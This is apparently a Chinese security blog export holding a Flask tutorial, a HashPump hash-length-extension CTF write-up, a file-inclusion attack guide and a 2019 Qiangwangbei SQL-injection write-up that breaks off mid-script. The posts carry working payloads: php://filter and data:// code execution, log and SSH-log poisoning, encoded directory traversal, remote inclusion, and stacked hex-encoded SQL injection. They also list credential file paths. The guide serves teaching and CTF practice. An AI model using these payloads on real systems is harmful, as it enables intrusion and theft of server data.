world。 debug模式开启debug模式 app.run(debug=True) 也可以分开写： app.debug = True app.run() 作用 将报错信息输出到页面 开启debug的文件内容如果被改动，就会自行重启服务器，也就是重新加载，不用在去重新运行python 1.py 路由flask通过route()装饰器将一个函数绑定到对应的URL上面 例如 from flask import Flask app = Flask(__name__) @app.route(&#39;/&#39;) def hello(): return &#39;Hello World!&#39; @app.route(&#39;/admin&#39;) def index(): return &#39;This is admin page!&#39; if __name__ ==&#39;__main__&#39;: app.debug = True app.run() 当我们访问localhost:5000/，就能在页面上看到Hello World!当我们访问localhost:5000/admin，就能在页面上看到This is admin page! 参数类型flask支持在路由上制定参数及参数类型,通过&lt;variable_name&gt;可以标记变量，这个部分将会作为命名参数传递到你的函数，也可以通过&lt;converter:variable_name&gt;指定一个可选的装饰器： from flask import Flask app = Flask(__name__) @app.route(&#39;/admin/&lt;username&gt;&#39;) def show_user_profile(username): return &#39;admin %s&#39; % username @app.route(&#39;/post/&lt;int:post_id&gt;&#39;) def show_post(post_id,post_name): return &#39;Post_id is %d &#39; % post_id if __name__ ==&#39;__main__&#39;: app.debug = True app.run() 这里访问localhost:5000/admin/user1，会看到admin user1。访问localhost:5000/post/1，会看到Post_id is 1，且必须为int型，因为这里限制了参数类型。 类型转换器 作用 缺省 字符型，但不能有斜杠 int: 整型 float: 浮点型 path: 字符型，可有斜杠 HTTP方法 如果需要处理具体的HTTP方法，在Flask中也很容易，使用route装饰器的methods参数设置即可。 # -*- coding: utf-8 -*- from flask import Flask,request import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) app = Flask(__name__) @app.route(&#39;/getone&#39;,methods=[&#39;GET&#39;]) def show_get(): # name = request.args #{&quot;age&quot;: &quot;12&quot;, &quot;name&quot;: &quot;a&quot;} name = request.args[&#39;name&#39;] age = request.args[&#39;age&#39;] return &#39;Your name is %s age is %s&#39; % (name,str(age)) @app.route(&#39;/get&#39;, methods=[&#39;GET&#39;]) def show(): get_methods = request.args.items() #可以获取get的全部参数 存储方式： [(&#39;age&#39;, u&#39;12&#39;), (&#39;name&#39;, u&#39;a&#39;)] return &#39;第一个参数名字为 %s 他的值为 %s 第二个参数名字为 %s 他的值为： %s&#39; % (get_methods[0][0],str(get_methods[0][1]),get_methods[1][0],get_methods[1][1]) @app.route(&#39;/post&#39;,methods=[&#39;POST&#39;]) def show_post(): name = request.form[&#39;name&#39;] age = request.form[&#39;age&#39;] return &#39;Your name is %s age is %s&#39; % (name,str(age)) if __name__== &#39;__main__&#39;: app.debug = True app.run() 其中可以通过request.method来判断请求的类型，是GET还是POST。 如果不写明methods的话，post请求将不被允许 request.args.get()方法则可以获取Get请求URL中的参数，该函数的第二个参数是默认值，当URL参数不存在时，则返回默认值 获取get和post传递的参数的方法不同。 get 用 request.args.get[&#39;name&#39;] POST用 request.form.get[&#39;name&#39;] 唯一 URL / 重定向行为@app.route(&#39;/admin/&#39;) def projects(): return &#39;The project page&#39; @app.route(&#39;/user&#39;) def about(): return &#39;The about page&#39; 当访问localhost:5000/admin时，flask会自动重定向到正确的地址上。但是访问localhost:5000/user/时，flask会直接报404的错误。 使用route设置路径的时候最好带上斜线 构造URLFlask提供了url_for()方法来快速获取及构建URL方法。其第一个参数指向函数名（加过@app.route注解的函数），后续的参数为对应于要构建的URL变量。 url_for(&#39;login&#39;) # 返回/login url_for(&#39;login&#39;, id=&#39;1&#39;) # 将id作为URL参数，返回/login?id=1 url_for(&#39;static&#39;, filename=&#39;style.css&#39;) # 静态文件地址，返回/static/style.css 和redirect一起使用可以达到页面跳转的效果 #encoding: utf-8 from flask import Flask,url_for,request,redirect app = Flask(__name__) @app.route(&#39;/&#39;) def index(): login_url = url_for(&#39;login&#39;) # /login/ return redirect(login_url) return u&#39;这是首页&#39; @app.route(&#39;/login/&#39;) def login(): return u&#39;这是登陆页面&#39; @app.route(&#39;/question/&lt;is_login&gt;/&#39;) def question(is_login): if is_login == &#39;1&#39;: return u&#39;这是发布问答的页面&#39; else: return redirect(url_for(&#39;login&#39;)) # /login/ return url_for(&#39;login&#39;,id=&#39;admin&#39;) if __name__== &#39;__main__&#39;: app.run(debug=True) 当我们访问localhost:5000/时，会自动跳转到login页面显示这是登陆页面。 加载静态文件 语法 url_for(&#39;static&#39;,filename=&#39;路径&#39;) 静态文件 ，flask会自动从static文件夹开始寻找，所以不需要再写static这个路径 可以加载css文件，js文件，还有image图片 要把静态文件放在static目录下 url_for(&#39;static&#39;, filename=&#39;style.css&#39;) Flask渲染Jinja2模板和传参(html模板使用)flask的渲染方法有render_template和render_template_string两种。 模板的使用需要 导入render_template和render_template_string 模块。 Flask默认使用Jinja2作为模板，默认情况下，模板文件需要放在templates文件夹下。 调用示例 # return render_template(&#39;demo.html&#39;) # return render_template_string(&#39;&lt;script&gt;alert(1);&lt;/script&gt;&#39;) render_template的具体使用： from flask import Flask,render_template app = Flask(__name__) @app.route(&#39;/hello/&#39;) @app.route(&#39;/hello/&lt;name&gt;&#39;) def index(name=None): return render_template(&quot;demo.html&quot;, name=name) if __name__== &#39;__main__&#39;: app.run(debug=True) demo.html &lt;html&gt; &lt;head&gt; &lt;title&gt;admin&lt;/title&gt; &lt;/head&gt; &lt;body&gt; {% if name %} Hello {{ name }}! {% else %} Hello World! {% endif %} &lt;/body&gt; &lt;/html&gt; 当我们访问localhost:5000/hello，页面会输出Hello World!当我们访问localhost:5000/hello/admin，页面会输出Hello admin! 变量或表达式由`{{ ... }}`修饰，而控制语句由`{% ... %}`修饰，其他的代码，就是我们常见的HTML。 模板的继承模板可以继承其他模板，我们可以将布局设置为父模板，让其他模板继承，这样可以非常方便的控制整个程序的外观。 先写一下block的作用，extends是继承了整个layout.html文件里的所有的公用代码 例如这里有一个layout.html模板，它是整个程序的布局文件。 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;title&gt;{% block title %}{% endblock %} {% block body %}{% endblock %} &lt;/div&gt; &lt;div class=&quot;container footer&quot;&gt; &lt;hr&gt; &lt;p&gt;这是页脚&lt;/p&gt; &lt;/div&gt; &lt;script src=&quot;{{ url_for('static',filename='js/jquery.js') }}&quot;&gt;&lt;/script&gt; &lt;script src=&quot;{{ url_for('static',filename='js/bootstrap.js') }}&quot;&gt;&lt;/script&gt; 对应的继承show.html {% extends 'layout.html' %} {% block title %}主页{% endblock %} {% block body %} 主页 本项目演示了Flask的简单使用方法，点击导航栏上的菜单条查看具体功能。 {% endblock %} 这里如果不使用block，直接在show.html 中写html代码的话，页面是无法正常显示html代码的。所以要在layout.html中添加一个模板，然后在子文件中使用block来继承模板，然后再在block中写html代码。 block就相当于占位符的作用。 这两个页面相当于这样的一个页面： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;title&gt;主页&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;static/css/bootstrap.css&quot;/&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;static/css/bootstrap-theme.css&quot;/&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;container body-content&quot;&gt; &lt;div class=&quot;jumbotron&quot;&gt; &lt;h1&gt;主页&lt;/h1&gt; &lt;p&gt;本项目演示了Flask的简单使用方法，点击导航栏上的菜单条查看具体功能。&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;container footer&quot;&gt; &lt;hr&gt; &lt;p&gt;这是页脚&lt;/p&gt; &lt;/div&gt; &lt;script src=&quot;static/js/jquery.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/js/bootstrap.js&quot;&gt;&lt;/script&gt; 当我们存在一些重复的页面功能时，我们可以使用这个方法 控制流if条件判断可以这么写 {% ... %}中也可以写Python代码 &lt;html&gt; &lt;head&gt; &lt;title&gt;admin&lt;/title&gt; &lt;/head&gt; &lt;body&gt; {% if name %} Hello {{ name }}! {% else %} Hello World! {% endif %} &lt;/body&gt; &lt;/html&gt; 循环，和在Python中遍历差不多。 for.py from flask import Flask,render_template app = Flask(__name__) @app.route(&#39;/for&#39;) def for_list(): user = [&#39;admin&#39;,&#39;test&#39;,&#39;chuddy&#39;,&#39;aaa&#39;] return render_template(&#39;for.html&#39;,user=user) if __name__== &#39;__main__&#39;: app.run(debug = True) for.html &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; {% for i in user %} name is : {{i}} {% endfor %} &lt;/body&gt; &lt;/html&gt; 过滤器default 如果变量的值为空，则取default设置的值。 demo.html &lt;html&gt; &lt;head&gt; &lt;title&gt;admin&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello {{ name|default('World') }}!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 1.py from flask import Flask,render_template app = Flask(__name__) @app.route(&#39;/hello/&#39;) @app.route(&#39;/hello/&lt;name&gt;&#39;) def index(name=None): return render_template(&quot;demo.html&quot;, name=name) if __name__== &#39;__main__&#39;: app.run(debug = True) 常见内建过滤器字符串操作 safe：禁用转义 &lt;p&gt;{{ 'hello' | safe }}&lt;/p&gt; capitalize：把变量值的首字母转成大写，其余字母转小写 &lt;p&gt;{{ 'hello' | capitalize }}&lt;/p&gt; lower：把值转成小写 &lt;p&gt;{{ 'HELLO' | lower }}&lt;/p&gt; upper：把值转成大写 &lt;p&gt;{{ 'hello' | upper }}&lt;/p&gt; title：把值中的每个单词的首字母都转成大写 &lt;p&gt;{{ 'hello' | title }}&lt;/p&gt; reverse：字符串反转 &lt;p&gt;{{ 'olleh' | reverse }}&lt;/p&gt; format：格式化输出 &lt;p&gt;{{ '%s is %d' | format('name',17) }}&lt;/p&gt; striptags：渲染之前把值中所有的HTML标签都删掉 &lt;p&gt;{{ 'hello' | striptags }}&lt;/p&gt; truncate: 字符串截断 &lt;p&gt;{{ 'hello every one' | truncate(9)}}&lt;/p&gt; 列表操作 first：取第一个元素 &lt;p&gt;{{ [1,2,3,4,5,6] | first }}&lt;/p&gt; last：取最后一个元素 &lt;p&gt;{{ [1,2,3,4,5,6] | last }}&lt;/p&gt; length：获取列表长度 &lt;p&gt;{{ [1,2,3,4,5,6] | length }}&lt;/p&gt; sum：列表求和 &lt;p&gt;{{ [1,2,3,4,5,6] | sum }}&lt;/p&gt; sort：列表排序 &lt;p&gt;{{ [6,2,3,1,5,4] | sort }}&lt;/p&gt; sessionfrom flask import session app.config[&#39;SECRET_KEY&#39;] = os.urandom(24) #设置session @app.route(&#39;/sess/&#39;) def hi(): session[&#39;name&#39;] = &#39;admin&#39; return &#39;hello word&#39; # 读取session @app.route(&#39;/get/&#39;) def get(): return session.get(&#39;name&#39;) # 删除session其中的一个 @app.route(&#39;/delete/&#39;) def delete(): print session.get(&#39;name&#39;) session.pop(&#39;name&#39;) print session.get(&#39;name&#39;) return &#39;successs&#39; # 清除session中的所用变量 @app.route(&#39;/clear/&#39;) def clear(): print session.get(&#39;name&#39;) session.clear() print session.get(&#39;name&#39;) return &#39;successs&#39; # 设置session过期时间 @app.route(&#39;/sess/&#39;) def hi(): session[&#39;name&#39;] = &#39;admin&#39; # 默认是flase，会话结束后session就过期。设置是True后，过期时间为30天 session.permanent = True return &#39;hello word&#39;","categories":[],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"哈希长度拓展攻击———HashPump的使用","slug":"哈希长度拓展攻击———HashPump的使用","date":"2019-06-15T01:50:51.000Z","updated":"2019-08-21T07:46:16.805Z","comments":true,"path":"2019/06/15/哈希长度拓展攻击———HashPump的使用/","link":"","permalink":"http://yoursite.com/2019/06/15/哈希长度拓展攻击———HashPump的使用/","excerpt":"哈希长度拓展攻击前言在一些CTF的比赛题目中见到过这种类型的题目，当时都是写完就不管了，没有认真的总结过，现在总结一下哈希拓展攻击的一些利用方式。","text":"哈希长度拓展攻击前言在一些CTF的比赛题目中见到过这种类型的题目，当时都是写完就不管了，没有认真的总结过，现在总结一下哈希拓展攻击的一些利用方式。哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。 利用条件 知道密钥长度 知道明文 知道部分的密文 HashPump的使用方法通常遇到这种类型题，都是使用的HashPump这个工具来辅助求解的。 HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。 HashPump的安装我是安装在kali虚拟机上的 git clone https://github.com/bwall/HashPump apt-get install g++ libssl-dev cd HashPump make make install 这个工具还支持python拓展 pip install hashpumpy HashPump的使用方法题目一实验吧的——让我进去吧 打开题目发现是个登陆页面发现，尝试之后发现没有注册的页面，于是尝试抓包看一下是否存在什么东西 发现cookie之里面的source=0很突兀，尝试修改为1,发现出现了源码。 $flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;; $secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security! $username = $_POST[&quot;username&quot;]; $password = $_POST[&quot;password&quot;]; if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); } } setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[&quot;source&quot;])) { setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[&quot;source&quot;] != 0) { echo &quot;&quot;; // This source code is outputted here } } 代码审计一下： 我们发现时很明显的哈希长度攻击。 secret的长度 data的值 secret+data 的MD5值我们就能构造出secret+data+其他值 的MD5 获取flag的格式： 1.传进一个cookie使其等于secret+urldecode($username . $password)MD5加密后的结果且后面部分要求为adminadmin 所以我们需要的就是构造cookie使其相等 2.得到对应的getmein:一个MD5的值需要 我们可以使用HashPump这个攻击来进行构造： 就可以在不知密文的情况下，构造出一个合法的md5值。就可以通过验证得到flag。","categories":[],"tags":[{"name":"web常见漏洞","slug":"web常见漏洞","permalink":"http://yoursite.com/tags/web常见漏洞/"}]},{"title":"文件包含漏洞","slug":"文件包含漏洞","date":"2019-06-12T04:03:31.000Z","updated":"2019-06-13T13:26:26.011Z","comments":true,"path":"2019/06/12/文件包含漏洞/","link":"","permalink":"http://yoursite.com/2019/06/12/文件包含漏洞/","excerpt":"文件包含漏洞","text":"文件包含漏洞 简介文件包含这个漏洞，简单来说既是程序猿在开发中为了方便，会将在多个页面重复使用的代码单独写到一个文件中，在需要用到的地方直接包含进来，包含后的文件既相当于将被包含的整个文件内容复制到了包含处。因为在开发中是经常用到的，因此成为了攻击者的目标，便衍生了多种文件包含的攻击。 在php中文件包含函数include() include_once() require() require_once() filel_get_contents() fopen() readfile() 区别： include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行 require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行 require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件include_once()、require_once()与(include\\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。 在php中文件包含分为本地文件包含（LFI）和远程文件包含（RFI） 分类LFI(Local File Inclusion)本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。 RFI(Remote File Inclusion)远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。 但RFI的利用条件较为苛刻，需要php.ini中进行配置 allow_url_fopen = On allow_url_include = On 两个配置选项均需要为On，才能远程包含文件成功。 但是，在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 所以远程文件包含的利用条件比较苛刻. 本地文件包含(LFI)顾名思义，所要包含的文件是在服务器本身的文件 包含姿势php伪协议php://input利用条件： allow_url_include = On。 对allow_url_fopen不做要求。 姿势： php://filter利用它可以读取服务器中的文件 由于读取文件的数据直接输出在了页面上，如果读取的是php文件的话，浏览器会直接解析成php代码而不会显示，那么我们可以用这个协议将php文件中的代码以base64的形式输出在页面上： payload: index.php?file=php://filter/read=convert.base64-encode/resource=index.php 通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。 其他姿势： file.php?file=php://filter/convert.base64-encode/resource=index.php 效果跟前面一样，少了read等关键字。在绕过一些waf时也许有用。 phar://利用条件： php版本大于等于php5.3.0 假设有个文件phpinfo.php，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包phpinfo.zip 利用： 指定绝对路径： file.php?file=phar://D:/phpStudy/WWW/phpinfo.zip/phpinfo.php 也可以使用相对路径： file.php?file=phar://phpinfo.zip/phpinfo.php 都可以成功发包含文件。 zip://利用条件： php版本大于等于php5.3.0 姿势： 构造zip包的方法和phar相同。但是使用zip伪协议，需要指定绝对路径，同时将#编码为%23,之后填上压缩包内的文件·。 file.php?file=zip://D:/phpStudy/WWW/phpinfo.zip%23phpinfo.php 若是使用相对路径，则会包含失败。 data：URI schema利用条件： php版本大于等于php5.2 allow_url_fopen = On allow_url_include = On 姿势一： ?file=data:text/plain,&lt;?php phpinfo();?&gt; 也可以执行命令： ?file=data:text/plain,&lt;?php system(&#39;whoami&#39;);?&gt; 姿势二： ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt; 也可以执行命令： ?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg== PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==的base64解码为：&lt;?php system(&#39;whoami&#39;);?&gt; 包含session利用条件： session文件路径已知，且其中内容部分可控。 姿势： php的session文件的保存路径可以在phpinfo的session.save_path看到。 常见的php-session存放位置： /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID 其中，session文件的格式时固定的：sess_[phpsessid].而phpsessid在发送的请求的cookie字段中可以看到。 测试代码： &lt;?php session_start(); $_SESSION[&#39;chuddy&#39;]=$_GET[&#39;file&#39;]; @include($_GET[&#39;file&#39;]); ?&gt; 先随便尝试访问一下，存储一个session文件，我们打开访问：http://192.168.1.153/session.php?file=chuddy 查看这个session文件的内容为：chuddy|s:6:&quot;chuddy&quot;;#发现存储了file值。于是尝试包含session文件。 抓包访问：记住这个PHPSESSID=asudiplcmv80km7fb5klokpki0,于是得到session文件名为：sess_asudiplcmv80km7fb5klokpki0，所以session文件的路径为/var/lib/php/session/sess_asudiplcmv80km7fb5klokpki0 可以成功包含！ 本地日志等文件的包含顾名思义，所要包含的文件是在服务器本身的文件，我们可以读取一些在服务器上特殊的敏感信息 上网搜了一下敏感文件的位置： windows: c:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件 c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码 c:\\Program Files\\mysql\\my,ini // MySQL配置 c:\\Program Files\\mysql\\data\\mysql\\user.MYD // MySQL root c:\\windows\\php.ini // php 配置信息 c:\\windows\\my.ini // MySQL 配置文件 linux: /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 访问日志利用条件： 需要知道服务器日志的存储路径，且日志文件可读。 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，每个系统日志文件的存储位置不一样，centos日志保存路径在 /var/log/httpd/access.log , ubantu日志文件会保存在/var/log/apache2/access.log。 在本地常看日志会记录，一些什么信息。 192.168.1.115 - - [12/Jun/2019:15:19:23 +0800] &quot;GET /file.php HTTP/1.1&quot; 200 166&quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot; 通过对正常日志文件的分析发现，里面会存储我们访问的ip信息，请求的时间，请求求方式，url，客户端浏览器的信息等。 我们把shell藏在url里面 http://192.168.1.103/file.php?file=&lt;?php phpinfo();?&gt; 但是我们包含失败了，我们查看日志信息： 192.168.1.115 - - [13/Jun/2019:16:25:01 +0800] &quot;GET /file.php?file=%3C?php%20phpinfo();?%3E HTTP/1.1&quot; 200 203 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot; 发现一些特殊符号被编码使得无法正确解析。在access.log中还包括了用户访问的浏览器信息，也就是head头部中的User-Agent标识，如果我们把php代码插入到这里，那么同样也是可以执行的，先用burp抓一个包，插入php代码 然后查看日志文件： 192.168.1.115 - - [13/Jun/2019:04:02:42 +0800] &quot;GET /file.php?file=chuddy.php HTTP/1.1&quot; 200 - &quot;-&quot; &quot;&lt;?php phpinfo();?&gt;&quot; 发现php代码已经写在上面了。尝试包含即可 SSH日志包含利用条件：需要知道ssh-log的位置，且可读。 linux下ssh日志的位置： /var/log/secure /var/log/auth.log /var/log/messages Mac OS X(v10.4 or greater): /private/var/log/asl.log Mac OS X(v10.3 or earlier) /private/var/log/system.log Debian /var/log/auth.log centos的ssh日志路径为：/var/log/secure 我们尝试ssh连接ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@192.168.1.153 发现能在日志文件中成功写下&lt;?php phpinfo(); ?&gt;： Jun 13 04:37:43 localhost sshd[1829]: Invalid user &lt;?php phpinfo(); ?&gt; from 192.168.1.115 Jun 13 04:37:43 localhost sshd[1830]: input_userauth_request: invalid user &lt;?php phpinfo(); ?&gt; Jun 13 04:37:45 localhost sshd[1830]: Connection closed by 192.168.1.115 第一次尝试发现不能包含，查看之后，发现没有权限，赋给它权限之后才能成功包含。 包含临时文件php文件上传文件时，会创建临时文件。在linux下使用的是/tmp目录，而在windows下使用c:\\winsdows\\temp,在临时文件被删除之前，利用条件竞争可以包含该临时文件。这个和文件上传漏洞联系比较紧密。 加了一些限制的绕过方法在大多数的情况下，我们碰到的不会是简简单单的include $_GET[&#39;file&#39;];这样直接把变量传入包含函数内的，在很多时候包含的变量/文件，会被值订前缀和后缀。 指定前缀测试代码： &lt;?php $file = @$_GET[&#39;file&#39;]; include &#39;/var/www/html/&#39;.$file; ?&gt; 而在根目录下有一个flag文件内容为：&lt;?php phpinfo();?&gt; 目录遍历利用../可以进行目录遍历，比如我们尝试访问： include.php?file=../../../flag 则服务器端实际拼接出来的路径为：/var/www/html/../../../flag，也即/flag。从而包含成功。 但是有时候会对../做一些过滤，我们可以利用一些编码来进行绕过。 利用url编码 ../ %2e%2e%2f ..%2f %2e%2e/ ..\\ %2e%2e%5c ..%5c %2e%2e\\ 二次编码 ../ %252e%252e%252f ..\\ %252e%252e%255c 容器/服务器的编码方式 ../ ..%c0%af %c0%ae%c0%ae/ 注：java中会把”%c0%ae”解析为”\\uC0AE”，最后转义为ASCCII字符的”.”（点） Apache Tomcat Directory Traversal ..\\ ..%c1%9c 指定后缀名当包含的文件指定了后缀名时： &lt;?php @include($_GET[&#39;file&#39;].&quot;.html&quot;); ?&gt; 可以尝试利用以下方法绕过。 %00截断利用条件： 需要修改php.ini的配置： magic_quotes_gpc=off PHP小于5.3.4 例如上面例题代码一样：限制只能包含html文件。假如有一个phpinfo.php内容时&lt;?php phpinfo(); ?&gt;，直接包含时肯定不行的，文件名会变成phpinfo.php.html如果在参数后面加上一个%00，实现%00截断发现成功包含。 路径长度截断在windows最大长度是256，linux上是4096 payload: ?file=phpinfo.php/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ 点绕过适用于windows下，.要超过256 payload： ?file=phpinfo.php.................................................................................................................................................................................................................................................................. 远程文件包含(RFI)利用条件： allow_url_fopen = On allow_url_include = On 测试代码： &lt;?php $file = @$_GET[&#39;file&#39;]; @include($file); ?&gt; 在远程服务器上的文件代码(test.txt) &lt;?php phpinfo(); ?&gt; payload: http://127.0.0.1/file.php?file=http://192.168.1.103/test.txt 有限制远程文件包含漏洞绕过测试代码 &lt;?php $file = @$_GET[&#39;file&#39;]; @include($file.&quot;.html&quot;); ?&gt; 我们发现这里的后缀名被限制为.html。 urlurl格式： protocol :// hostname[:port] / path / [;parameters][?query]#fragment 在远程文件包含漏洞中，可以利用query或fragment来绕过后缀限制。 姿势一:query（?） http://127.0.0.1/file1.php?file=http://192.168.1.103/test.txt? 则包含的文件为 http://127.0.0.1/file1.php?file=http://192.168.1.103/test.txt?.html问号后面的部分.html，也就是指定的后缀被当作query从而被绕过。 姿势二：fragment（#） http://127.0.0.1/file1.php?file=http://192.168.1.103/test.txt%23 则包含的文件为问号后面的部分.html，也就是指定的后缀被当作fragment从而被绕过。注意需要把#进行url编码为%23。 windows和linux差别在windows上%00、%3f可以绕过，在linux除此之外%20也可以绕过 防御方案 在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败 做好文件的权限管理 php中可以使用open_basedir配置限制访问限制在指定的区域 过滤.、\\、/等 禁止服务器远程文件包含","categories":[],"tags":[{"name":"web常见漏洞","slug":"web常见漏洞","permalink":"http://yoursite.com/tags/web常见漏洞/"}]},{"title":"2019强网杯线上部分web writeup","slug":"2019强网杯线上部分web writeup","date":"2019-06-06T07:25:43.000Z","updated":"2019-06-07T08:31:48.352Z","comments":true,"path":"2019/06/06/2019强网杯线上部分web writeup/","link":"","permalink":"http://yoursite.com/2019/06/06/2019强网杯线上部分web writeup/","excerpt":"2019强网杯线上部分web writeup前言强网杯已经已经结束了好久了，都没有好好的总结一下，","text":"2019强网杯线上部分web writeup前言强网杯已经已经结束了好久了，都没有好好的总结一下， web随便注听名字就是一道注入的题目：题目链接 打开之后是一个,搜索框 提交1发现会输出一个对应的值，尝试一下1&#39;发现会得到报错，尝试一下万能密码1&#39; or &#39;1&#39;=&#39;1，发现能够把当前表所有的值全部输出出来，发现没有flag的值，意识到flag不再当前查询的表中，应该是在其他的表里面存着的。 尝试注入时，发现存在过滤： return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;, $inject); 发现过滤了select,.,where等，这就很难进行正常的注入了，需要另想办法。 尝试过报错注入，虽然能够得到数据库信息，但是过滤了select就很难进行进一步的注入。 通过多次的尝试，发现可以进行堆叠注入。 方法一通过堆叠注入，可以将sql注入的语句转换为16进制表示也可以bypass 1&#39;;set @t=0x73656c65637420312c323b;prepare x from @t;execute x; 但是尝试的时候发现过滤回显 strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;) 这是个strstr函数呀！可以用大小写绕过！ 将查询的字符串转换为16进制 payload = &quot;chuddy&#39;;set @s=%s;PREPARE a FROM @s;EXECUTE a;&quot; exp = &#39;select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()&#39; # exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;1919810931114514&#39;&quot; # exp = &quot;select flag from `1919810931114514`&quot; my_payload = payload%(&quot;0x&quot;+exp.encode(&#39;hex&#39;)) print my_payload payload为: 注表名： chuddy&#39;;set @s=0x73656c6563742067726f75705f636f6e636174285441424c455f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e5441424c4553207768657265205441424c455f534348454d413d64617461626173652829;PREPARE a FROM @s;EXECUTE a; 然后进行注列名 chuddy&#39;;set @s=0x73656c6563742067726f75705f636f6e63617428434f4c554d4e5f4e414d45292066726f6d20696e666f726d6174696f6e5f736368656d612e434f4c554d4e53207768657265205441424c455f4e414d453d273139313938313039333131313435313427;PREPARE a FROM @s;EXECUTE a; 得到flag chuddy&#39;;set @s=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;PREPARE a FROM @s;EXECUTE a; 方法二通过堆叠注入，尝试用char()进行绕过。 通过对sql注入的语句，转换成为单个的ascii码，然后通过char()函数进行转换以及利用concat()函数进行重新拼接，来bypass。 可以参考飘零师傅的博客。 进行编码的脚本： payload = &quot;0&#39;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot; exp = &#39;select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()&#39; # exp = &quot;select group_concat(COLUMN_NAME) from 